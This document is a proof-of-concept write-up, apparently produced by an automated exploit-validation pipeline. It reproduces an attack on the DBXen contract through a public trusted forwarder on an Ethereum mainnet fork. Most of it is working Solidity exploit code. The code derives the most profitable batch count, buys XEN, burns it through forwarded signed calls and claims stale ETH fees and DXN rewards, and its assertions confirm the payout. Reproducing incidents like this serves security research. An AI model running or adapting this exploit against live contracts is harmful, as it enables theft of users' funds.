DBXen Forwarder PoC
1. Overview & Context
This PoC reproduces the validated DBXen ACT exploit on an Ethereum mainnet fork. It shows that a fresh attacker can use the public trusted forwarder to burn the forwarder's XEN while keeping the attacker's DBXen lifecycle state stale, then immediately claim the exact historical ETH fee payout and cycle-0 DXN reward described in the root-cause analysis.

Run it with:

RPC_URL="<your_rpc_url>" forge test --via-ir -vvvvv
The validator rerun passes, so the PoC is not just a replay of copied attacker inputs. It derives the batch count and other attacker-controlled parameters from live fork state before executing the exploit.

2. PoC Architecture & Key Contracts
The PoC has one actor contract, Exploit, which uses a fresh local attacker EOA derived from ATTACKER_PK. The on-chain contracts are the Uniswap router for buying XEN, the public forwarder, DBXen itself, the XEN token that gets burned, and the DXN token minted by DBXen.

Core setup excerpt:

function setUp() external {
    string memory rpcUrl = vm.envString("RPC_URL");
    vm.createSelectFork(rpcUrl, FORK_TX);

    attacker = vm.addr(ATTACKER_PK);
    router = IUniswapV2Router02(ROUTER);
    forwarder = IForwarder(FORWARDER);
    dbxen = IDBXen(DBXEN);
    xen = IERC20(XEN);
    dxn = IERC20(dbxen.dxn());
    domainName = string.concat("txray-", vm.toString(attacker));
    domainVersion = vm.toString(block.chainid);
    requestGas = block.gaslimit / 10;

    vm.deal(attacker, 3 ether);
    vm.txGasPrice(block.basefee * 2 + 1);
}
This keeps the PoC self-contained. There are no imported attacker artifacts, no helper contracts from the incident, and no extra Solidity files.

3. Adversary Execution Flow
The test first registers a fresh forwarder domain for the local attacker, then derives the maximum profitable batch count from live fork state instead of copying the incident's 5560. It buys the required XEN on Uniswap, routes that XEN into the forwarder, signs a forwarded approve, signs a forwarded burnBatch, and finally signs forwarded claimFees and claimRewards calls.

Main exploit path:

function testExploit() external {
    vm.prank(attacker);
    forwarder.registerDomainSeparator(domainName, domainVersion);

    address[] memory path = new address[](2);
    path[0] = WETH;
    path[1] = XEN;

    uint256 batchCount = _deriveBatchCount(path);
    uint256 burnAmount = batchCount * dbxen.XEN_BATCH_AMOUNT();
    uint256 expectedReward = (batchCount * dbxen.rewardPerCycle(0)) / dbxen.cycleTotalBatchesBurned(0);
    uint256 expectedFees =
        (expectedReward * dbxen.cycleFeesPerStakeSummed(dbxen.currentCycle())) / dbxen.SCALING_FACTOR();

    uint256[] memory amountsIn = router.getAmountsIn(burnAmount, path);
    vm.prank(attacker);
    router.swapETHForExactTokens{value: amountsIn[0]}(burnAmount, path, FORWARDER, block.timestamp);

    _executeSigned(XEN, 0, abi.encodeWithSelector(IERC20.approve.selector, DBXEN, burnAmount));
    _executeSigned(DBXEN, attacker.balance, abi.encodeWithSelector(IDBXen.burnBatch.selector, batchCount));
    _executeSigned(DBXEN, 0, abi.encodeWithSelector(IDBXen.claimFees.selector));
    _executeSigned(DBXEN, 0, abi.encodeWithSelector(IDBXen.claimRewards.selector));
}
The validator log shows the derived flow reaches the same exploit state as the incident: the forwarder approves and burns 13,900,000,000 XEN, DBXen credits 5560 batches to the attacker, emits FeesClaimed for 65361960326939766177 wei, and emits RewardsClaimed for 2305427706597006261143 DXN.

4. Oracle Definitions and Checks
The oracle defines three pre-checks and three semantic success conditions.

Pre-checks:

The attacker must start with lastActiveCycle(attacker) == 0 and lastFeeUpdateCycle(attacker) == 0.
DBXen must already have a populated fee accumulator for the current cycle.
Cycle-0 reward data must be nonzero.
Hard constraints:

The forwarder becomes the active burner while the attacker remains at the cycle-0 baseline and receives accCycleBatchesBurned(attacker) == batchCount.
The attacker receives the exact DXN reward implied by rewardPerCycle(0) and cycleTotalBatchesBurned(0) for the derived batchCount.
Soft constraint:

The attacker receives the exact historical ETH fee payout implied by the same derived reward and cycleFeesPerStakeSummed(currentCycle).
The PoC implements those checks directly:

assertEq(dbxen.lastActiveCycle(FORWARDER), currentCycle);
assertEq(dbxen.lastActiveCycle(attacker), 0);
assertEq(dbxen.accCycleBatchesBurned(attacker), batchCount);

uint256 ethBeforeClaim = attacker.balance;
_executeSigned(DBXEN, 0, abi.encodeWithSelector(IDBXen.claimFees.selector));
assertEq(attacker.balance - ethBeforeClaim, expectedFees);

uint256 dxnBeforeClaim = dxn.balanceOf(attacker);
_executeSigned(DBXEN, 0, abi.encodeWithSelector(IDBXen.claimRewards.selector));
assertEq(dxn.balanceOf(attacker) - dxnBeforeClaim, expectedReward);
5. Validation Result and Robustness
The validator result is overall_status = "Pass". The PoC executes successfully under forge test --via-ir -vvvvv, matches the oracle, uses a single Exploit.sol file, avoids attacker-side artifacts, and runs entirely against a mainnet fork with no local mocks.

The important quality improvement over the previous rejected revision is parameter derivation. _deriveBatchCount binary-searches the maximum exploitable batch count under public pre-state constraints:

function _deriveBatchCount(address[] memory path) internal view returns (uint256 batchCount) {
    uint256 low = 0;
    uint256 high = MAX_BATCHES;
    uint256 batchAmount = dbxen.XEN_BATCH_AMOUNT();
    uint256 swapBudget = attacker.balance - requestGas * tx.gasprice;

    while (low < high) {
        uint256 mid = (low + high + 1) / 2;
        uint256 burnAmount = mid * batchAmount;
        uint256 swapCost = _swapCost(path, burnAmount);
        uint256 reward = (mid * dbxen.rewardPerCycle(0)) / dbxen.cycleTotalBatchesBurned(0);
        uint256 fees = (reward * dbxen.cycleFeesPerStakeSummed(dbxen.currentCycle())) / dbxen.SCALING_FACTOR();

        if (swapCost <= swapBudget && fees <= address(DBXEN).balance) low = mid;
        else high = mid - 1;
    }
}
That is why the PoC now satisfies the no-magic-numbers gate while still converging to the same exploitable batch count on the tx-hash fork.

6. Linking PoC Behavior to Root Cause
The PoC succeeds for the same reason the real exploit succeeded: the forwarder calls XEN and DBXen as the forwarder, while DBXen credits burn accounting and payouts to _msgSender(). The exploit sequence therefore decouples the XEN burn source from the rewarded account.

The adversary-crafted steps are the swap, forwarded approval, forwarded burn, and forwarded claims. The victim-observed effects are that lastActiveCycle is updated for the forwarder, accCycleBatchesBurned is updated for the attacker, and DBXen then pays out the stale-account ETH and DXN amounts. That mapping is exactly the ACT predicate from the validated root cause: a permissionless attacker can realize the protocol bug using only public contracts, public state, and self-generated signatures.